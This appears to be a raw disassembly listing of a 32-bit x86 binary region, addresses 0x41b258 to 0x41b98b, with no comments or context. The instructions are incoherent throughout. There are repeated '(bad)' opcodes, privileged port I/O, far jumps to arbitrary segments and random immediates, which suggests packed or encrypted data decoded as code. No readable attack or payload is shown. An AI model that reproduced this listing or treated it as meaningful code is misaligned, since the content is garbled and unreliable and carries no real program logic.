  41b258:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b259:	loopne 0x41b287
  41b25b:	js     0x41b245
  41b25d:	test   al,0x69
  41b25f:	push   esi
  41b260:	aad    0x66
  41b262:	inc    edx
  41b263:	stos   BYTE PTR es:[edi],al
  41b264:	in     al,dx
  41b265:	mov    bl,0xd2
  41b267:	dec    ebx
  41b268:	fnstenv [ecx+ecx*2+0x155cea92]
  41b26f:	pop    ebx
  41b270:	ja     0x41b22e
  41b272:	adc    al,0x3e
  41b274:	inc    edx
  41b275:	adc    edx,DWORD PTR [esi]
  41b277:	cli    
  41b278:	out    0x9f,eax
  41b27a:	adc    bl,BYTE PTR [esi]
  41b27c:	icebp  
  41b27d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b27e:	pop    edx
  41b27f:	mov    dh,0x1a
  41b281:	clc    
  41b282:	or     eax,0x853fd6b6
  41b287:	test   BYTE PTR [ebp+0x2d],ch
  41b28a:	stos   DWORD PTR es:[edi],eax
  41b28b:	mov    ds:0x6a863066,eax
  41b290:	outs   dx,BYTE PTR ds:[esi]
  41b291:	stos   DWORD PTR es:[edi],eax
  41b292:	cmp    DWORD PTR [bp+di-0x14],0xf451fe26
  41b29a:	cvtpi2ps xmm7,QWORD PTR [edx-0xf004fac]
  41b2a1:	out    dx,eax
  41b2a2:	pop    ebp
  41b2a3:	adc    ch,cl
  41b2a5:	in     al,0xd0
  41b2a7:	(bad)  
  41b2a8:	jmp    0x41b325
  41b2aa:	xor    dl,BYTE PTR [edx-0xe70ce0]
  41b2b0:	(bad)  
  41b2b1:	jmp    0x85af:0xa116193
  41b2b8:	jmp    0x41b2bf
  41b2ba:	pusha  
  41b2bb:	add    DWORD PTR [ebx+0x734db5e0],0xffffffcc
  41b2c2:	push   ebx
  41b2c3:	pushf  
  41b2c4:	test   BYTE PTR [esi-0x3b20a68d],ch
  41b2ca:	xor    ecx,DWORD PTR [edx+eiz*4]
  41b2cd:	and    eax,0x2d3ac83a
  41b2d2:	imul   ebx,DWORD PTR [edi],0x22d1d6f9
  41b2d8:	and    eax,0xee608b32
  41b2dd:	fcmovu st,st(2)
  41b2df:	scas   eax,DWORD PTR es:[edi]
  41b2e0:	inc    edx
  41b2e1:	int3   
  41b2e2:	fst    st(6)
  41b2e4:	aas    
  41b2e5:	xchg   ebx,eax
  41b2e6:	hlt    
  41b2e7:	sub    ebp,edx
  41b2e9:	test   al,0x82
  41b2eb:	pop    ecx
  41b2ec:	stos   DWORD PTR es:[edi],eax
  41b2ed:	ja     0x41b301
  41b2ef:	int    0x8c
  41b2f1:	les    esp,FWORD PTR [ebp-0xc]
  41b2f4:	dec    ebx
  41b2f5:	pop    ds
  41b2f6:	lea    ebp,ds:[ebx]
  41b2f9:	jne    0x41b358
  41b2fb:	push   ecx
  41b2fc:	test   eax,0x38b6c790
  41b301:	cmp    al,0xa7
  41b303:	pop    edi
  41b304:	jmp    0x81be:0xa9c6ca2f
  41b30b:	xchg   ebx,eax
  41b30c:	shl    BYTE PTR [ecx],1
  41b30e:	les    edi,FWORD PTR gs:[edi-0x1782f1ca]
  41b315:	push   0x61
  41b317:	dec    edx
  41b318:	sub    al,0xb1
  41b31a:	retf   0x2b37
  41b31d:	std    
  41b31e:	dec    ebp
  41b31f:	test   BYTE PTR [eax],ah
  41b321:	out    0x3c,al
  41b323:	cmp    cl,BYTE PTR [edi-0x2470c565]
  41b329:	sub    al,0x7b
  41b32b:	xor    al,0x73
  41b32d:	sbb    DWORD PTR [eax-0x32],eax
  41b330:	push   edi
  41b331:	aaa    
  41b332:	sub    edx,DWORD PTR [edi-0x36e66c45]
  41b338:	inc    esp
  41b339:	sbb    BYTE PTR [edi+ecx*2-0x3933e86f],cl
  41b340:	xor    al,0x48
  41b342:	inc    esp
  41b343:	jmp    0xd5cd4819
  41b348:	add    al,0x4f
  41b34a:	loope  0x41b328
  41b34c:	or     ah,BYTE PTR [edi-0x11]
  41b34f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b350:	jmp    0x4c1a322
  41b355:	fdiv   DWORD PTR ds:0xaf619678
  41b35b:	mov    eax,ds:0x67c29ebb
  41b360:	mov    ch,0x22
  41b362:	and    al,0xe7
  41b364:	push   ecx
  41b365:	retf   0xdcf8
  41b368:	xor    cl,0x46
  41b36b:	js     0x41b2fb
  41b36d:	jecxz  0x41b378
  41b36f:	sub    al,0x2b
  41b371:	imul   edi,DWORD PTR [edx-0x5],0xffffffce
  41b375:	in     eax,dx
  41b376:	xor    eax,0xa17dca9c
  41b37b:	sbb    ebp,esi
  41b37d:	stos   BYTE PTR es:[edi],al
  41b37e:	lahf   
  41b37f:	mov    dh,0x55
  41b381:	mov    bh,0xaf
  41b383:	cmp    al,0x2d
  41b385:	bound  edi,QWORD PTR [esi]
  41b387:	add    bl,BYTE PTR [ebx+0x220c72cc]
  41b38d:	push   ds
  41b38e:	add    bh,bh
  41b390:	test   DWORD PTR [eax],ebp
  41b392:	scas   al,BYTE PTR es:[edi]
  41b393:	xor    eax,0x47ea4584
  41b398:	outs   dx,DWORD PTR ds:[esi]
  41b399:	sub    DWORD PTR es:[esi+0x1b95fba0],esp
  41b3a0:	icebp  
  41b3a1:	(bad)  [eax+0x1b]
  41b3a4:	jns    0x41b3a7
  41b3a6:	cs scas eax,DWORD PTR es:[edi]
  41b3a8:	scas   eax,DWORD PTR es:[edi]
  41b3a9:	repnz pop ebp
  41b3ab:	push   esi
  41b3ac:	sub    ah,bl
  41b3ae:	mov    bl,0x29
  41b3b0:	push   ebp
  41b3b1:	pop    ecx
  41b3b2:	sub    DWORD PTR [ebp-0x18],edi
  41b3b5:	jmp    0xdb5416e3
  41b3ba:	and    ah,0x85
  41b3bd:	div    BYTE PTR [ecx]
  41b3bf:	fiadd  DWORD PTR [esi-0x6409e579]
  41b3c5:	sub    edi,DWORD PTR [esp+eiz*8-0x1e]
  41b3c9:	sub    edi,edx
  41b3cb:	sub    eax,0x10582128
  41b3d0:	jecxz  0x41b3dc
  41b3d2:	fwait
  41b3d3:	enter  0x70a1,0x90
  41b3d7:	in     al,0x87
  41b3d9:	clc    
  41b3da:	les    eax,FWORD PTR [ecx+edi*4]
  41b3dd:	inc    edi
  41b3de:	mov    cl,0x7b
  41b3e0:	popf   
  41b3e1:	push   0x77c23a59
  41b3e6:	jle    0x41b370
  41b3e8:	pop    ds
  41b3e9:	clc    
  41b3ea:	or     cl,cl
  41b3ec:	xchg   esi,eax
  41b3ed:	lea    ebx,[ecx-0x12]
  41b3f0:	int3   
  41b3f1:	push   esp
  41b3f2:	pop    ebp
  41b3f3:	ds test cl,dh
  41b3f6:	dec    eax
  41b3f7:	adc    al,0x6f
  41b3f9:	(bad)  
  41b3fa:	addr16 xchg ebp,eax
  41b3fc:	aaa    
  41b3fd:	scas   eax,DWORD PTR es:[edi]
  41b3fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3ff:	dec    edx
  41b400:	mov    fs,WORD PTR [esi-0xe]
  41b403:	dec    edx
  41b404:	mov    bh,BYTE PTR [ebp-0x7bb4c957]
  41b40a:	enter  0xa5a6,0x97
  41b40e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b40f:	gs aad 0x6f
  41b412:	mov    ch,0x66
  41b414:	mov    edi,0x1123e578
  41b419:	mov    fs:0x60add02e,al
  41b41f:	div    BYTE PTR [esi-0x77df41f5]
  41b425:	lahf   
  41b426:	sbb    al,0xfb
  41b428:	fmul   st(2),st
  41b42a:	shl    BYTE PTR [eax],1
  41b42c:	imul   BYTE PTR [edx]
  41b42e:	ret    0x55e2
  41b431:	and    BYTE PTR [edx-0x61d2c235],bh
  41b437:	loop   0x41b415
  41b439:	dec    ebx
  41b43a:	add    bl,BYTE PTR [eax]
  41b43c:	cmc    
  41b43d:	div    BYTE PTR [esi]
  41b43f:	pop    ecx
  41b440:	mov    dl,0xa1
  41b442:	adc    BYTE PTR [edx-0x638dc158],al
  41b448:	dec    ebx
  41b449:	or     bl,ch
  41b44b:	jge    0x41b4ab
  41b44d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b44e:	inc    esi
  41b44f:	ret    
  41b450:	cmp    ah,BYTE PTR [eax-0x60]
  41b453:	(bad)  
  41b454:	mov    al,ds:0x5f804b37
  41b459:	icebp  
  41b45a:	add    al,0x42
  41b45c:	mov    al,ds:0xecab67a2
  41b461:	retf   
  41b462:	(bad)
  41b465:	loope  0x41b43f
  41b467:	xchg   eax,esp
  41b469:	(bad)  
  41b46a:	test   al,0x33
  41b46c:	mov    edx,0x1c646fb5
  41b471:	pop    ds
  41b472:	mov    ds,WORD PTR [ebx-0x49]
  41b475:	lea    edx,[esi-0x7]
  41b478:	into   
  41b479:	dec    edi
  41b47a:	cli    
  41b47b:	fwait
  41b47c:	xor    dl,dl
  41b47e:	bound  esi,QWORD PTR [edx]
  41b480:	bound  ebx,QWORD PTR [ebx+0x14371ae9]
  41b486:	pop    ebp
  41b487:	mov    ebp,0x32eb05d1
  41b48c:	mov    bl,0xe4
  41b48e:	push   0xa9829fbb
  41b493:	cmc    
  41b494:	sub    DWORD PTR [eax+0x1c],eax
  41b497:	push   eax
  41b498:	pop    ss
  41b499:	push   cs
  41b49a:	pop    esi
  41b49b:	in     al,0x60
  41b49d:	lds    esp,FWORD PTR [esi+0xf57a527]
  41b4a3:	mov    dh,0x2
  41b4a5:	fucom  st(1)
  41b4a7:	pushf  
  41b4a8:	mov    ah,0xe5
  41b4aa:	bound  edx,QWORD PTR [eax+0x60]
  41b4ad:	fs mov ebx,ebx
  41b4b0:	cmc    
  41b4b1:	iret   
  41b4b2:	(bad)  
  41b4b3:	mov    ah,0xcf
  41b4b5:	mov    cl,0x1
  41b4b7:	pop    edi
  41b4b8:	push   esi
  41b4b9:	pop    esi
  41b4ba:	repz cmp al,0xb6
  41b4bd:	addr16 gs pushf 
  41b4c0:	add    al,0xc5
  41b4c2:	dec    esi
  41b4c3:	xor    eax,0x3742e4fb
  41b4c8:	add    esi,esi
  41b4ca:	mov    edi,0x4fb1dae
  41b4cf:	pop    eax
  41b4d0:	mov    edx,0xd665ee93
  41b4d5:	xor    ecx,DWORD PTR [edi+0x1e]
  41b4d8:	fist   WORD PTR [esi-0x4c6a599b]
  41b4de:	dec    ebp
  41b4df:	dec    eax
  41b4e0:	ds jle 0x41b4a0
  41b4e3:	data16 jae 0x41b498
  41b4e6:	fst    QWORD PTR [ebp+ebp*1+0xcfb15eb]
  41b4ed:	(bad)  
  41b4ee:	shl    BYTE PTR [ecx-0x23fe6447],cl
  41b4f4:	imul   esi,DWORD PTR [ecx],0xffffff82
  41b4f7:	inc    edi
  41b4f8:	dec    ecx
  41b4f9:	daa    
  41b4fa:	push   cs
  41b4fb:	cmp    cl,BYTE PTR [eax+0xf]
  41b4fe:	dec    eax
  41b4ff:	ins    DWORD PTR es:[edi],dx
  41b500:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b501:	loop   0x41b56d
  41b503:	test   eax,0x38827436
  41b508:	mov    bl,0x52
  41b50a:	push   edx
  41b50b:	nop
  41b50c:	jl     0x41b521
  41b50e:	mov    edx,0x600f0e4d
  41b513:	dec    esi
  41b514:	leave  
  41b515:	fild   QWORD PTR [edx-0x4e]
  41b518:	pushf  
  41b519:	jmp    0x9ea97ab9
  41b51e:	xchg   edx,eax
  41b51f:	pop    ss
  41b520:	ins    BYTE PTR es:[edi],dx
  41b521:	jns    0x41b58c
  41b523:	imul   edi,DWORD PTR [esi],0xa4c7575e
  41b529:	adc    DWORD PTR [edi],ebx
  41b52b:	inc    ebx
  41b52c:	add    bh,BYTE PTR [ebx+0x2c]
  41b52f:	scas   eax,DWORD PTR es:[edi]
  41b530:	cld    
  41b531:	lock mov WORD PTR ds:0xa3211970,?
  41b538:	pop    esi
  41b539:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b53a:	mov    eax,esp
  41b53c:	scas   al,BYTE PTR es:[edi]
  41b53d:	lds    ebp,FWORD PTR [edx]
  41b53f:	fdivr  DWORD PTR [edi]
  41b541:	push   edx
  41b542:	sbb    cl,BYTE PTR [ebp+0x6]
  41b545:	and    ch,BYTE PTR [edi-0x2a]
  41b548:	mov    cs,ebp
  41b54a:	cli    
  41b54b:	cmp    DWORD PTR [ebx+0x41],edx
  41b54e:	div    DWORD PTR [eax+0x24]
  41b551:	push   edx
  41b552:	push   ds
  41b553:	pop    eax
  41b554:	ss repnz mov ecx,0xbc2007e7
  41b55b:	push   ebx
  41b55c:	mov    ch,BYTE PTR [eax]
  41b55e:	je     0x41b574
  41b560:	inc    edi
  41b561:	dec    esi
  41b562:	sbb    dl,dl
  41b564:	xchg   esi,eax
  41b565:	cmp    edx,DWORD PTR [eax]
  41b567:	sahf   
  41b568:	adc    BYTE PTR fs:[esi+0x433fd8de],ch
  41b56f:	test   DWORD PTR ds:[edx],0x1632ac9e
  41b576:	push   esi
  41b577:	lods   al,BYTE PTR ds:[esi]
  41b578:	in     al,0xbf
  41b57a:	adc    eax,0x49061156
  41b57f:	repz sub eax,0xc2463796
  41b585:	pop    eax
  41b586:	call   0xbc4a663e
  41b58b:	pop    dx
  41b58d:	lsl    ecx,si
  41b590:	jmp    0x67cd:0xacdb0aaa
  41b597:	cmp    BYTE PTR [edi-0x2b],cl
  41b59a:	mov    edi,DWORD PTR [esi]
  41b59c:	mov    esp,ebx
  41b59e:	aad    0xd1
  41b5a0:	leave  
  41b5a1:	inc    esp
  41b5a2:	out    0x99,eax
  41b5a4:	fbstp  TBYTE PTR gs:[ebp+0x718f1f0]
  41b5ab:	clc    
  41b5ac:	cmp    DWORD PTR [ebx],ecx
  41b5ae:	mov    ch,0xc7
  41b5b0:	stc    
  41b5b1:	mov    edx,0x156e92a9
  41b5b7:	xchg   esi,eax
  41b5b8:	xor    al,0xd6
  41b5ba:	call   0x17b1470f
  41b5bf:	test   eax,0x355e1777
  41b5c4:	scas   al,BYTE PTR es:[edi]
  41b5c5:	cwde   
  41b5c6:	cmp    al,BYTE PTR [ecx+0x58]
  41b5c9:	pusha  
  41b5ca:	data16 sti 
  41b5cc:	inc    ebp
  41b5cd:	dec    ecx
  41b5ce:	push   es
  41b5cf:	pop    esi
  41b5d0:	mov    eax,ds:0x21cccd44
  41b5d5:	stos   BYTE PTR es:[edi],al
  41b5d6:	pop    esp
  41b5d7:	push   ebx
  41b5d8:	adc    al,0xa7
  41b5da:	adc    esp,DWORD PTR [eax-0x4b2789c8]
  41b5e0:	adc    ebx,eax
  41b5e2:	fcomp  DWORD PTR [ebx]
  41b5e4:	out    dx,al
  41b5e5:	xchg   DWORD PTR [edi-0x7c],edx
  41b5e8:	adc    BYTE PTR [edx],bl
  41b5ea:	lods   eax,DWORD PTR ds:[esi]
  41b5eb:	inc    ecx
  41b5ec:	push   ds
  41b5ed:	je     0x41b660
  41b5ef:	dec    edx
  41b5f0:	adc    bl,al
  41b5f2:	sub    BYTE PTR [edx+edx*2+0x2bde36ef],bl
  41b5f9:	cdq    
  41b5fa:	or     al,0x2e
  41b5fc:	push   0x58c0d4c3
  41b601:	or     al,0x30
  41b604:	(bad)  ds:[eax+0x567b2905]
  41b60b:	or     DWORD PTR [ebx],ebp
  41b60d:	inc    ebp
  41b60e:	retfw  0x8b4d
  41b612:	mov    esi,0x33e2fc2f
  41b617:	ja     0x41b5ab
  41b619:	clc    
  41b61a:	mov    ch,0x42
  41b61c:	push   edi
  41b61d:	(bad)  
  41b61e:	rcr    BYTE PTR [bx+si],0xdf
  41b622:	add    al,0x52
  41b624:	adc    eax,DWORD PTR [ebp+0x42]
  41b627:	push   0x94f60483
  41b62c:	add    bl,BYTE PTR [eax+0x64910f0f]
  41b632:	out    0x5,al
  41b634:	push   cs
  41b635:	jae    0x41b5b7
  41b637:	rol    DWORD PTR [edx-0x2a33a210],0x3c
  41b63e:	pop    ds
  41b63f:	or     al,BYTE PTR [ecx]
  41b641:	enter  0x3e61,0x5e
  41b645:	loopne 0x41b636
  41b647:	add    BYTE PTR [edi],bh
  41b649:	(bad)  
  41b64a:	lahf   
  41b64b:	pop    ss
  41b64c:	jb     0x41b626
  41b64e:	jg     0x41b610
  41b650:	outs   dx,DWORD PTR ds:[esi]
  41b651:	test   al,0x4e
  41b653:	push   edx
  41b654:	xchg   ecx,eax
  41b655:	adc    al,0xc8
  41b657:	ins    BYTE PTR es:[edi],dx
  41b658:	inc    ecx
  41b659:	xlat   BYTE PTR ds:[ebx]
  41b65a:	ret    0x8e5e
  41b65d:	lods   eax,DWORD PTR ds:[esi]
  41b65e:	shl    DWORD PTR [ecx],0x39
  41b661:	jle    0x41b6c3
  41b663:	es mov ebx,0xdf589361
  41b669:	aam    0xac
  41b66b:	or     bl,BYTE PTR [edx-0x3c]
  41b66e:	push   cs
  41b66f:	test   al,0xeb
  41b671:	mov    ecx,0xfb7534bf
  41b676:	sub    al,0x69
  41b678:	rol    DWORD PTR [ecx+0x4d],cl
  41b67b:	stos   BYTE PTR es:[edi],al
  41b67c:	pop    es
  41b67d:	inc    ecx
  41b67e:	xor    DWORD PTR [eax],esp
  41b680:	cld    
  41b681:	adc    al,dh
  41b683:	bound  ebx,QWORD PTR [edi+0x60]
  41b686:	dec    ebp
  41b687:	or     ah,BYTE PTR [ebx+0x8]
  41b68a:	sti    
  41b68b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b68c:	fs push 0xa7626060
  41b692:	cld    
  41b693:	dec    esp
  41b694:	add    bl,BYTE PTR [edx-0x18d38c02]
  41b69a:	dec    ecx
  41b69b:	mov    esp,0xf3a88f8c
  41b6a0:	scas   al,BYTE PTR es:[edi]
  41b6a1:	or     edx,eax
  41b6a3:	rcr    dl,0x27
  41b6a6:	imul   ebx,DWORD PTR [ebx],0xa2f55441
  41b6ac:	jno    0x41b708
  41b6ae:	leave  
  41b6af:	dec    esi
  41b6b0:	or     al,0xfb
  41b6b2:	stos   DWORD PTR es:[edi],eax
  41b6b3:	mov    al,ds:0x48a147a7
  41b6b8:	pusha  
  41b6b9:	arpl   WORD PTR [ecx],di
  41b6bb:	and    DWORD PTR [eax-0x3d057944],eax
  41b6c1:	shr    BYTE PTR [esi],0x50
  41b6c4:	daa    
  41b6c5:	or     esi,eax
  41b6c7:	or     esi,DWORD PTR [ecx-0x562ea1b7]
  41b6cd:	inc    ecx
  41b6ce:	adc    BYTE PTR [edx],cl
  41b6d0:	pusha  
  41b6d1:	out    0x20,eax
  41b6d3:	cmp    eax,0xeecdc2d9
  41b6d8:	(bad)  
  41b6d9:	cmp    eax,0x2e8176e6
  41b6de:	push   es
  41b6df:	nop
  41b6e0:	pop    esp
  41b6e1:	stc    
  41b6e2:	dec    edi
  41b6e3:	xchg   DWORD PTR [esi+0x137af050],ebx
  41b6e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6ea:	or     al,0x47
  41b6ec:	xchg   BYTE PTR [edi+0x74],ch
  41b6ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6f0:	jl     0x41b688
  41b6f2:	jo     0x41b67f
  41b6f4:	xchg   edx,eax
  41b6f5:	test   al,0xd9
  41b6f7:	sti    
  41b6f8:	in     al,0x20
  41b6fa:	and    eax,0xa16e9d4
  41b6ff:	inc    ebp
  41b700:	pop    eax
  41b701:	cs mov dl,0x7e
  41b704:	(bad)  
  41b705:	fisub  DWORD PTR [esp+ebp*1]
  41b708:	ss mov dl,0x25
  41b70b:	imul   BYTE PTR [ebx-0xc5f18f5]
  41b711:	jecxz  0x41b706
  41b713:	and    eax,edi
  41b715:	fild   WORD PTR [esi]
  41b717:	push   ebp
  41b718:	jp     0x41b6f2
  41b71a:	dec    esp
  41b71b:	mov    ch,0xb3
  41b71d:	and    BYTE PTR [eax+0x65],ch
  41b720:	xchg   ebx,eax
  41b721:	ins    DWORD PTR es:[edi],dx
  41b722:	mov    ch,0xcd
  41b724:	je     0x41b6e3
  41b726:	test   edi,edx
  41b728:	xchg   esp,eax
  41b729:	shr    BYTE PTR [esi+0x51],cl
  41b72c:	or     eax,0x324756e
  41b731:	mov    ah,0xc8
  41b733:	cmp    edx,DWORD PTR [esi+eax*2+0x61]
  41b737:	push   ds
  41b738:	js     0x41b6fb
  41b73a:	arpl   cx,si
  41b73c:	mov    al,ds:0xe97c79ed
  41b741:	bound  ebx,QWORD PTR [esi]
  41b743:	lea    eax,[esi+0x5e399e8c]
  41b749:	in     eax,0x53
  41b74b:	ds mov ah,0xc
  41b74e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b74f:	ret    
  41b750:	scas   al,BYTE PTR es:[edi]
  41b751:	dec    edi
  41b752:	sub    eax,0x7ef07459
  41b757:	stc    
  41b758:	and    eax,0x7d67385a
  41b75d:	push   esi
  41b75e:	adc    al,0x72
  41b760:	imul   ebp,DWORD PTR [edx+0x5eb050fd],0x64
  41b767:	pusha  
  41b768:	or     edx,DWORD PTR [bx]
  41b76b:	ins    DWORD PTR es:[edi],dx
  41b76c:	outs   dx,BYTE PTR ds:[esi]
  41b76d:	push   es
  41b76e:	int    0x5a
  41b770:	test   dh,dl
  41b772:	mov    DWORD PTR [edx-0x17],edx
  41b775:	add    edi,DWORD PTR [edx+edi*1-0x357b56fa]
  41b77c:	pusha  
  41b77d:	xor    edi,0x31
  41b780:	sbb    eax,DWORD PTR ss:[eax]
  41b783:	loopne 0x41b769
  41b785:	icebp  
  41b786:	xchg   edi,eax
  41b787:	pop    ds
  41b788:	fmul   st,st(1)
  41b78a:	sub    eax,0x7709fe99
  41b78f:	ret    0xb35e
  41b792:	mov    esi,0x37ee86d3
  41b797:	push   eax
  41b798:	adc    eax,0x5082f6f4
  41b79d:	mov    ebp,DWORD PTR [edx+0x4b3514a9]
  41b7a3:	popa   
  41b7a4:	in     eax,0xb
  41b7a6:	jge    0x41b7e3
  41b7a8:	cmp    dh,bh
  41b7aa:	or     al,0xb2
  41b7ac:	popf   
  41b7ad:	call   0xf103:0x515c300e
  41b7b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7b5:	imul   eax,DWORD PTR [ebx+0x5a],0x28bd811b
  41b7bc:	es dec esi
  41b7be:	jbe    0x41b7b9
  41b7c0:	jge    0x41b7a8
  41b7c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7c3:	les    ebp,FWORD PTR [ebp-0x69d3664]
  41b7c9:	outs   dx,BYTE PTR ds:[esi]
  41b7ca:	jle    0x41b7a9
  41b7cc:	call   0xd05308ba
  41b7d1:	push   ds
  41b7d2:	xchg   ebx,eax
  41b7d3:	jge    0x41b7c8
  41b7d5:	inc    esp
  41b7d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7d7:	data16 mov ds:0xa781e232,al
  41b7dd:	dec    esi
  41b7de:	cli    
  41b7df:	sbb    BYTE PTR [eax+0x7a],ch
  41b7e2:	xchg   DWORD PTR [eax-0x31b04dd3],eax
  41b7e8:	mov    esp,0x2c7ce4fe
  41b7ed:	jp     0x41b7f6
  41b7ef:	out    dx,al
  41b7f0:	(bad)  [esi-0x2762cbc4]
  41b7f6:	bound  edx,QWORD PTR [ebx]
  41b7f8:	or     esi,ebx
  41b7fa:	into   
  41b7fb:	out    0x56,eax
  41b7fd:	cmp    eax,0xaf13eea1
  41b802:	push   0x5a3c30b3
  41b807:	jg     0x41b7e6
  41b809:	repz push ss
  41b80b:	ja     0x41b872
  41b80d:	adc    BYTE PTR [esi+0x2d],bh
  41b810:	mov    ah,0xf3
  41b812:	imul   ebx,DWORD PTR [esi-0x4aff6dc6],0x219de1bb
  41b81c:	int3   
  41b81d:	enter  0xb94f,0xdd
  41b821:	pushf  
  41b822:	inc    eax
  41b823:	les    esi,FWORD PTR [edx-0x36]
  41b826:	inc    ecx
  41b827:	int3   
  41b828:	aam    0x84
  41b82a:	sahf   
  41b82b:	mov    ds:0xc78667c9,al
  41b830:	pop    es
  41b831:	lods   al,BYTE PTR ds:[esi]
  41b832:	and    BYTE PTR [edx+0x47],cl
  41b835:	(bad)  
  41b836:	cld    
  41b837:	sbb    BYTE PTR [eax],bl
  41b839:	pop    ss
  41b83a:	xchg   esi,eax
  41b83b:	jno    0x41b7d0
  41b83d:	inc    ebx
  41b83e:	push   0x8a072195
  41b843:	outs   dx,BYTE PTR ds:[esi]
  41b844:	sub    DWORD PTR [eax-0x265fc645],ebp
  41b84a:	sbb    eax,0x6b883657
  41b84f:	dec    eax
  41b850:	std    
  41b851:	sbb    edx,DWORD PTR [edx+0x6c498165]
  41b857:	jle    0x41b8ad
  41b859:	mov    al,ds:0x77c4031a
  41b85e:	out    dx,al
  41b85f:	idiv   BYTE PTR [eax-0x2a]
  41b862:	sbb    ecx,edi
  41b864:	repz mov ch,0xc5
  41b867:	sbb    esi,DWORD PTR [eax+0x35]
  41b86a:	xchg   ebx,eax
  41b86b:	mov    esp,0x23a84e67
  41b870:	adc    eax,0x31c72487
  41b875:	mov    WORD PTR [edx+0x5706edf4],ss
  41b87b:	pop    eax
  41b87c:	pop    ebp
  41b87d:	shr    BYTE PTR [ebp+ecx*8-0x6ac52924],0x21
  41b885:	sar    DWORD PTR [ebp+0x28ad5fc5],1
  41b88b:	dec    eax
  41b88c:	cmp    bl,BYTE PTR [ebx+0xd]
  41b88f:	mov    dl,BYTE PTR [ecx+0x74]
  41b892:	sar    BYTE PTR [edi],0x29
  41b895:	mov    bh,0x3
  41b897:	out    0xf4,eax
  41b899:	mov    ebp,0x3e6d68c7
  41b89e:	not    dl
  41b8a0:	into   
  41b8a1:	push   ebx
  41b8a2:	push   ds
  41b8a3:	pushf  
  41b8a4:	outs   dx,BYTE PTR ds:[esi]
  41b8a5:	icebp  
  41b8a6:	xchg   ecx,eax
  41b8a7:	fstp   DWORD PTR [edi+0x49691c78]
  41b8ad:	push   ds
  41b8ae:	push   ecx
  41b8af:	call   0xec67:0x1fe82e7d
  41b8b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8b7:	aaa    
  41b8b8:	cmc    
  41b8b9:	aaa    
  41b8ba:	mov    ebx,0x2291085f
  41b8bf:	adc    BYTE PTR [ecx],dh
  41b8c1:	dec    edx
  41b8c2:	mov    ch,0xe1
  41b8c4:	stos   DWORD PTR es:[edi],eax
  41b8c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8c6:	jle    0x41b8a6
  41b8c8:	cmp    DWORD PTR [ebx+0x4cc59f28],esi
  41b8ce:	bound  ebp,QWORD PTR [esi]
  41b8d0:	popf   
  41b8d1:	xor    ebp,DWORD PTR [eax+0x53]
  41b8d4:	ja     0x41b86a
  41b8d6:	adc    bl,cl
  41b8d8:	mov    ah,0x65
  41b8da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8db:	sbb    al,0x98
  41b8dd:	cmovne edi,DWORD PTR [ecx+0x3d98922f]
  41b8e4:	mov    bl,0x81
  41b8e6:	mov    al,0x2e
  41b8e8:	inc    ecx
  41b8e9:	shl    DWORD PTR [esi+0x56],1
  41b8ec:	add    eax,0x78fdc754
  41b8f1:	test   al,ch
  41b8f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8f4:	xchg   esi,eax
  41b8f5:	std    
  41b8f6:	mov    cl,BYTE PTR [esi-0x6d40208d]
  41b8fc:	jmp    0x41b88c
  41b8fe:	mov    edx,0xf4fe94b0
  41b903:	sub    edx,ebx
  41b905:	jmp    0xe920:0x4c2e3c26
  41b90c:	in     al,dx
  41b90d:	int3   
  41b90e:	out    dx,eax
  41b90f:	pop    eax
  41b910:	(bad)  
  41b911:	jge    0x41b8ae
  41b913:	adc    eax,0x4edcd00d
  41b918:	add    DWORD PTR [ebp-0x7e],edx
  41b91b:	inc    esp
  41b91c:	pop    ebx
  41b91d:	in     al,dx
  41b91e:	es std 
  41b920:	pop    es
  41b921:	enter  0xcfc6,0x41
  41b925:	hlt    
  41b926:	nop
  41b927:	sub    al,0x8f
  41b929:	mov    ebx,0x854c7a74
  41b92e:	cmp    ecx,ecx
  41b930:	(bad)  
  41b931:	sbb    edi,ecx
  41b933:	clc    
  41b934:	pop    ss
  41b935:	add    edi,DWORD PTR [eax+edx*8]
  41b938:	cmp    al,0xde
  41b93a:	inc    esp
  41b93b:	push   ecx
  41b93c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b93e:	sti    
  41b93f:	or     BYTE PTR [ecx+0x64],bl
  41b942:	mov    edi,0xa0fc0540
  41b947:	cmp    BYTE PTR [edx],ah
  41b949:	xchg   ebx,eax
  41b94a:	mov    ?,WORD PTR [eax-0x7075b3e3]
  41b950:	pop    es
  41b951:	js     0x41b900
  41b953:	mov    WORD PTR [eax+0x19f86739],?
  41b959:	xchg   ebp,eax
  41b95a:	inc    ebx
  41b95b:	gs daa 
  41b95d:	dec    eax
  41b95e:	jbe    0x41b9c3
  41b960:	rcr    DWORD PTR [esi+eiz*8],1
  41b963:	mov    edx,0x22daaf9a
  41b968:	pop    eax
  41b969:	or     al,BYTE PTR [ebx+0x30]
  41b96c:	aad    0xa
  41b96e:	popf   
  41b96f:	and    al,0xcf
  41b971:	popf   
  41b972:	clc    
  41b973:	dec    edi
  41b974:	dec    ebp
  41b975:	mov    ch,dh
  41b977:	ins    DWORD PTR es:[edi],dx
  41b978:	fwait
  41b979:	enter  0x4919,0xbf
  41b97d:	push   es
  41b97e:	mov    WORD PTR [edi-0x60],ds
  41b981:	xchg   edx,eax
  41b982:	or     bh,bh
  41b984:	gs push edi
  41b986:	sub    eax,0xc4a9344f
  41b98b:	(bad)  
